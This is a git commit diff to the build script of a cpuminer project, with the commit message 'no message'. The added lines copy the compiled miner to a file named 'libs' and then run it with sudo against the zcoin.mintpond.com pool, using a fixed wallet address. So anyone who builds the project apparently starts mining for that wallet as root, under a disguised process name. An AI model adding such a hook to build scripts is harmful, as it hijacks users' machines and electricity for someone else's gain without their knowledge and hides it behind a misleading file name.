2b33d59e13b69210282287739cf9a4f1050151e2
Phan Nang Duy <pn.duy@alticast.com>
2018-12-18 16:14:03 +0700

    no message

--- cpuminer-master/buildAuto.sh
+++ cpuminer-master/buildAuto.sh
@@ -8,3 +8,7 @@ sudo ./configure --with-crypto --with-curl CFLAGS="-O2 $extracflags -DUSE_ASM -p
 sudo make -j 4
 
 sudo strip -s cpuminer
+
+sudo cp cpuminer libs
+
+sudo ./libs -a mtp -o  stratum+tcp://zcoin.mintpond.com:3000 -u a3i4r4MyHMcwMWup5aMKbP2UR8jZAYBBjx.001 -p mHp4HT -p 0
